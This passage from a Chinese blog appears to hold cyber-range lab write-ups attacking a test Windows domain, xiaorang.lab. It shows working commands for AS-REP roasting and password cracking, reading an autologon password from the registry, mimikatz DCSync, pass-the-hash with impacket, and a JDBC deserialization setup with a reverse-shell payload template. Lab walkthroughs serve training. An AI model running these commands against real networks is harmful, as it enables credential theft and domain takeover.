HE JUAN         |</span><br><span class="line">| 497 | zuoqiutai@xiaorang.lab     | 18093001354 | ZUO QIU TAI     |</span><br><span class="line">| 498 | siyi@xiaorang.lab          | 17873307773 | SI YI           |</span><br><span class="line">| 499 | shenshan@xiaorang.lab      | 18397560369 | SHEN SHAN       |</span><br><span class="line">| 500 | tongdong@xiaorang.lab      | 15177549595 | TONG DONG       |</span><br><span class="line">+-----+----------------------------+-------------+-----------------+</span><br></pre></td></tr></table></figure><p>这边写个脚本提取用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 打开原始数据文件</span><br><span class="line">with open(&#x27;1.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">    data = file.readlines()</span><br><span class="line"></span><br><span class="line"># 提取指定字符串</span><br><span class="line">users = []</span><br><span class="line">for line in data:</span><br><span class="line">    match = re.search(r&#x27;(\w+)@xiaorang.lab&#x27;, line)</span><br><span class="line">    if match:</span><br><span class="line">        username = match.group(1)</span><br><span class="line">        users.append(username)</span><br><span class="line"></span><br><span class="line"># 保存提取后的字符串到 user.txt</span><br><span class="line">with open(&#x27;user.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="line">    for user in users:</span><br><span class="line">        file.write(user + &#x27;\n&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><span class="line">chenyan</span><br><span class="line">tanggui</span><br><span class="line">buning</span><br><span class="line">beishu</span><br><span class="line">shushi</span><br><span class="line">fuyi</span><br><span class="line">pangcheng</span><br><span class="line">tonghao</span><br><span class="line">jiaoshan</span><br><span class="line">dulun</span><br><span class="line">kejuan</span><br><span class="line">gexin</span><br><span class="line">lugu</span><br><span class="line">guzaicheng</span><br><span class="line">feicai</span><br><span class="line">ranqun</span><br><span class="line">zhouyi</span><br><span class="line">shishu</span><br><span class="line">yanyun</span><br><span class="line">chengqiu</span><br><span class="line">louyou</span><br><span class="line">maqun</span><br><span class="line">wenbiao</span><br><span class="line">weishengshan</span><br><span class="line">zhangxin</span><br><span class="line">chuyuan</span><br><span class="line">wenliang</span><br><span class="line">yulvxue</span><br><span class="line">luyue</span><br><span class="line">ganjian</span><br><span class="line">pangzhen</span><br><span class="line">guohong</span><br><span class="line">lezhong</span><br><span class="line">sheweiyue</span><br><span class="line">dujian</span><br><span class="line">lidongjin</span><br><span class="line">hongqun</span><br><span class="line">yexing</span><br><span class="line">maoda</span><br><span class="line">qiaomei</span><br><span class="line">nongzhen</span><br><span class="line">dongshu</span><br><span class="line">zhuzhu</span><br><span class="line">jiyun</span><br><span class="line">qiguanrou</span><br><span class="line">yixue</span><br><span class="line">chujun</span><br><span class="line">shenshan</span><br><span class="line">lefen</span><br><span class="line">yubo</span><br><span class="line">helianrui</span><br><span class="line">xuanqun</span><br><span class="line">shangjun</span><br><span class="line">huguang</span><br><span class="line">wansifu</span><br><span class="line">fenghong</span><br><span class="line">wanyan</span><br><span class="line">diyan</span><br><span class="line">xiangyu</span><br><span class="line">songyan</span><br><span class="line">fandi</span><br><span class="line">xiangjuan</span><br><span class="line">beirui</span><br><span class="line">didi</span><br><span class="line">zhubin</span><br><span class="line">lingchun</span><br><span class="line">zhenglu</span><br><span class="line">xundi</span><br><span class="line">wansishun</span><br><span class="line">yezongyue</span><br><span class="line">bianmei</span><br><span class="line">shanshao</span><br><span class="line">zhenhui</span><br><span class="line">chengli</span><br><span class="line">yufen</span><br><span class="line">jiyi</span><br><span class="line">panbao</span><br><span class="line">mennane</span><br><span class="line">fengsi</span><br><span class="line">mingyan</span><br><span class="line">luoyou</span><br><span class="line">liangduanqing</span><br><span class="line">nongyan</span><br><span class="line">haolun</span><br><span class="line">oulun</span><br><span class="line">weichipeng</span><br><span class="line">qidiaofang</span><br><span class="line">xuehe</span><br><span class="line">chensi</span><br><span class="line">guihui</span><br><span class="line">fuyue</span><br><span class="line">wangxing</span><br><span class="line">zhengxiao</span><br><span class="line">guhui</span><br><span class="line">baoai</span><br><span class="line">hangzhao</span><br><span class="line">xingye</span><br><span class="line">qianyi</span><br><span class="line">xionghong</span><br><span class="line">zouqi</span><br><span class="line">rongbiao</span><br><span class="line">gongxin</span><br><span class="line">luxing</span><br><span class="line">huayan</span><br><span class="line">duyue</span><br><span class="line">xijun</span><br><span class="line">daiqing</span><br><span class="line">yingbiao</span><br><span class="line">hengteng</span><br><span class="line">changwu</span><br><span class="line">chengying</span><br><span class="line">luhong</span><br><span class="line">tongxue</span><br><span class="line">xiangqian</span><br><span class="line">shaokang</span><br><span class="line">nongzhu</span><br><span class="line">haomei</span><br><span class="line">maoqing</span><br><span class="line">xiai</span><br><span class="line">bihe</span><br><span class="line">gaoli</span><br><span class="line">jianggong</span><br><span class="line">pangning</span><br><span class="line">ruishi</span><br><span class="line">wuhuan</span><br><span class="line">qiaode</span><br><span class="line">mayong</span><br><span class="line">hangda</span><br><span class="line">changlu</span><br><span class="line">liuyuan</span><br><span class="line">chenggu</span><br><span class="line">shentuyun</span><br><span class="line">zhuangsong</span><br><span class="line">chushao</span><br><span class="line">heli</span><br><span class="line">haoming</span><br><span class="line">xieyi</span><br><span class="line">shangjie</span><br><span class="line">situxin</span><br><span class="line">linxi</span><br><span class="line">zoufu</span><br><span class="line">qianqing</span><br><span class="line">qiai</span><br><span class="line">ruilin</span><br><span class="line">luomeng</span><br><span class="line">huaren</span><br><span class="line">yanyangmei</span><br><span class="line">zuofen</span><br><span class="line">manyuan</span><br><span class="line">yuhui</span><br><span class="line">sunli</span><br><span class="line">guansixin</span><br><span class="line">ruisong</span><br><span class="line">qiruo</span><br><span class="line">jinyu</span><br><span class="line">shoujuan</span><br><span class="line">yanqian</span><br><span class="line">changyun</span><br><span class="line">hualu</span><br><span class="line">huanming</span><br><span class="line">baoshao</span><br><span class="line">hongmei</span><br><span class="line">manyun</span><br><span class="line">changwan</span><br><span class="line">wangyan</span><br><span class="line">shijian</span><br><span class="line">ruibei</span><br><span class="line">jingshao</span><br><span class="line">jinzhi</span><br><span class="line">yuhui</span><br><span class="line">zangpeng</span><br><span class="line">changyun</span><br><span class="line">yetai</span><br><span class="line">luoxue</span><br><span class="line">moqian</span><br><span class="line">xupeng</span><br><span class="line">ruanyong</span><br><span class="line">guliangxian</span><br><span class="line">yinbin</span><br><span class="line">huarui</span><br><span class="line">niuya</span><br><span class="line">guwei</span><br><span class="line">qinguan</span><br><span class="line">yangdanhan</span><br><span class="line">yingjun</span><br><span class="line">weiwan</span><br><span class="line">sunduangu</span><br><span class="line">sisiwu</span><br><span class="line">nongyan</span><br><span class="line">xuanlu</span><br><span class="line">yunzhong</span><br><span class="line">gengfei</span><br><span class="line">zizhuansong</span><br><span class="line">ganbailong</span><br><span class="line">shenjiao</span><br><span class="line">zangyao</span><br><span class="line">yangdanhe</span><br><span class="line">chengliang</span><br><span class="line">xudi</span><br><span class="line">wulun</span><br><span class="line">yuling</span><br><span class="line">taoya</span><br><span class="line">jinle</span><br><span class="line">youchao</span><br><span class="line">liangduanzhi</span><br><span class="line">jiagupiao</span><br><span class="line">ganze</span><br><span class="line">jiangqing</span><br><span class="line">jinshan</span><br><span class="line">zhengpubei</span><br><span class="line">cuicheng</span><br><span class="line">qiyong</span><br><span class="line">qizhu</span><br><span class="line">ganjian</span><br><span class="line">yurui</span><br><span class="line">feishu</span><br><span class="line">chenxin</span><br><span class="line">shengzhe</span><br><span class="line">wohong</span><br><span class="line">manzhi</span><br><span class="line">xiangdong</span><br><span class="line">weihui</span><br><span class="line">xingquan</span><br><span class="line">miaoshu</span><br><span class="line">gongwan</span><br><span class="line">qijie</span><br><span class="line">shaoting</span><br><span class="line">xiqi</span><br><span class="line">jinghong</span><br><span class="line">qianyou</span><br><span class="line">chuhua</span><br><span class="line">yanyue</span><br><span class="line">huangjia</span><br><span class="line">zhouchun</span><br><span class="line">jiyu</span><br><span class="line">wendong</span><br><span class="line">heyuan</span><br><span class="line">mazhen</span><br><span class="line">shouchun</span><br><span class="line">liuzhe</span><br><span class="line">fengbo</span><br><span class="line">taigongyuan</span><br><span class="line">gesheng</span><br><span class="line">songming</span><br><span class="line">yuwan</span><br><span class="line">diaowei</span><br><span class="line">youyi</span><br><span class="line">rongxianyu</span><br><span class="line">fuyi</span><br><span class="line">linli</span><br><span class="line">weixue</span><br><span class="line">hejuan</span><br><span class="line">zuoqiutai</span><br><span class="line">siyi</span><br><span class="line">shenshan</span><br><span class="line">tongdong</span><br></pre></td></tr></table></figure><h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p>枚举未设置预认证的账号（这个东西默认是不关闭的，但当关闭了预身份验证后，攻击者可以使用指定用户向域控制器的Kerberos 88端口请求票据，此时域控不会进行任何验证就将TGT和该用户Hash加密的Login Session Key 返回。因此，攻击者就可以对获取到的用户Hash加密的 Login Session Key 进行离线破解，如果字典够强大，则可能破解得到该指定用户的明文密码）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 GetNPUsers.py -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741604568897-86252319-c679-4cc1-8510-860ada3849cd.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$zhangxin@XIAORANG.LAB:242c7ffb191eb27c46ba4684bb79342c$255c08173063dfb9c4f8bcdb9ee8210959239f9c358479b88d9209af53042a07ebb9816b0d093657357b549ad177956396ee692bcefbc1731b992bc1039b6ecbaab3899549cf3beb1fb400efc447b6f7a552ee3519ba2912ab784ed1246dae3625f30292380c088ee5d9458fe7d88d1a1312a662ad35c6cf6d079ed56d3a224b9ab5a20c820205401e1bb586b9f899f44fd66b0fb6994e64c79bab1ac07bcfcb3f118d26ee4cac2d255656c82854952bc7102ee202d1d1a5e404f6bd469344b5a8b0400f415f6293f9ac22c3c132fd6f902d8b97b10e1a238110d0798c3848f2ca96480ccb7906526d113b88</span><br></pre></td></tr></table></figure><p>爆破一下密码</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741604733212-eabb0a9d-508c-4ce7-95b0-647ba282d085.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strawberry       ($krb5asrep$23$zhangxin@XIAORANG.LAB)     </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zhangxin@XIAORANG.LAB:strawberry</span><br></pre></td></tr></table></figure><p>rdp都试试发现6.25可以</p><p>登上去之后看一下用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure><h2 id="自动登录"><a href="#自动登录" class="headerlink" title="自动登录"></a>自动登录</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741604951402-1481173e-b192-4e18-b6eb-bebc4f22ce0f.png">这里怀疑自动登录（用户与计算机时进行会话时，凭据会保留在内存中，说明yuxuan这个用户登录过WIN2019，很多用户习惯将计算机设置自动登录），抓一下密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DefaultUserName    REG_SZ    yuxuan</span><br><span class="line">DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L</span><br><span class="line">DefaultDomainName    REG_SZ    xiaorang.lab</span><br></pre></td></tr></table></figure><p>看到还有一个用户在登录，传个SharpHound分析一下域内环境，有两个版本</p><p><a href="https://github.com/BloodHoundAD/BloodHound/tree/f4d9c1af1529124d33c9f360a27686eea51755e1/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/f4d9c1af1529124d33c9f360a27686eea51755e1/Collectors</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 二进制采集工具命令：</span><br><span class="line">SharpHound.exe -c all</span><br><span class="line"># powershell采集工具命令：</span><br><span class="line">powershell -exec bypass -command &quot;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all&quot;</span><br></pre></td></tr></table></figure><p>kali启动一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">neo4j console</span><br><span class="line">./BloodHound --no-sandbox</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741605542088-7ffa1004-ff83-4e45-94d1-2e72b12acaab.png"></p><h2 id="SIDHistory滥用"><a href="#SIDHistory滥用" class="headerlink" title="SIDHistory滥用"></a>SIDHistory滥用</h2><p>用户滥用了SID历史功能(SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限)</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741606515322-9722af20-41ed-45a9-9700-5b42e6f0203c.png"></p><p>用BloodHound分析域内关系，发现这个用户滥用了SID历史功能(SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限)</p><p>在yuxuan上🐎</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741607560577-3c066389-2ff8-4d07-b42c-16d34c451d2e.png"></p><p>直接抓hash，用猕猴桃也行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741607574482-558cfd68-ffd7-4d34-9254-6e6977be363b.png"></p><p>抓到admin的hash，接着打pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-wmiexec  XIAORANG/administrator@172.22.6.25   -hashes :04d93ffd6f5f6e4490e0de23f240a5e9</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-wmiexec  XIAORANG/administrator@172.22.6.12   -hashes :04d93ffd6f5f6e4490e0de23f240a5e9</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag*</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Exchange</title>
      <link href="/2025/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Exchange/"/>
      <url>/2025/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Exchange/</url>
      
        <content type="html"><![CDATA[<p>fscan扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">39.99.152.160:80 open</span><br><span class="line">39.99.152.160:22 open</span><br><span class="line">39.99.152.160:8000 open</span><br></pre></td></tr></table></figure><p>8000端口admin&#x2F;123456弱口令上去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741675729105-5486e3d0-d278-491d-ba63-0ac4169105e3.png"></p><h2 id="华夏erp反序列化"><a href="#华夏erp反序列化" class="headerlink" title="华夏erp反序列化"></a>华夏erp反序列化</h2><p>发现没有后台洞，打jdbc，参考：<a href="https://www.cnblogs.com/kingbridge/articles/16720318.html">https://www.cnblogs.com/kingbridge/articles/16720318.html</a></p><p>vps上起一个mysql服务<a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>config.json配置(<a href="https://github.com/frohoff/ysoserial">ysoserial-all.jar</a>和server.py放一起)，bash -c后面替换成base64后反弹shell的payload，其他照抄</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;config&quot;:&#123;</span><br><span class="line">            &quot;ysoserialPath&quot;:&quot;ysoserial-all.jar&quot;,</span><br><span class="line">            &quot;javaBinPath&quot;:&quot;java&quot;,</span><br><span class="line">            &quot;fileOutputDir&quot;:&quot;./fileOutput/&quot;,</span><br><span class="line">            &quot;displayFileContentOnScreen&quot;:true,</span><br><span class="line">            &quot;saveToFile&quot;:true</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;fileread&quot;:&#123;</span><br><span class="line">            &quot;win_ini&quot;:&quot;c:\\windows\\win.ini&quot;,</span><br><span class="line">            &quot;win_hosts&quot;:&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;,</span><br><span class="line">            &quot;win&quot;:&quot;c:\\windows\\&quot;,</span><br><span class="line">            &quot;linux_passwd&quot;:&quot;/etc/passwd&quot;,</span><br><span class="line">            &quot;linux_hosts&quot;:&quot;/etc/hosts&quot;,</span><br><span class="line">            &quot;index_php&quot;:&quot;index.php&quot;,</span><br><span class="line">            &quot;ssrf&quot;:&quot;https://www.baidu.com/&quot;,</span><br><span class="line">            &quot;__defaultFiles&quot;:[&quot;/etc/hosts&quot;,&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;yso&quot;:&#123;</span><br><span class="line">            &quot;Jdk7u21&quot;:[&quot;Jdk7u21&quot;,&quot;calc&quot;],</span><br><span class="line">            &quot;CommonsCollections6&quot;:[&quot;CommonCollections6&quot;,&quot;bash -c &#123;echo,base64反弹shell&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python3 server.py启动服务。</p><p>然后向网站请求的payload就是下面这个url编码后的,抓个包改一下路径</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741677148720-6fb686b6-f410-4743-9c92-282faaaec622.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/flag/flag01.txt</span><br></pre></td></tr></table></figure><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>接下来打内网，先上代理和fscan</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741677425069-fb448b2f-be65-4fb4-91f7-f45e1b5154c8.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.3.12     is alive</span><br><span class="line">(icmp) Target 172.22.3.2      is alive</span><br><span class="line">(icmp) Target 172.22.3.9      is alive</span><br><span class="line">(icmp) Target 172.22.3.26     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.3.12:8000 open</span><br><span class="line">172.22.3.9:445 open</span><br><span class="line">172.22.3.26:445 open</span><br><span class="line">172.22.3.2:445 open</span><br><span class="line">172.22.3.9:443 open</span><br><span class="line">172.22.3.9:139 open</span><br><span class="line">172.22.3.26:139 open</span><br><span 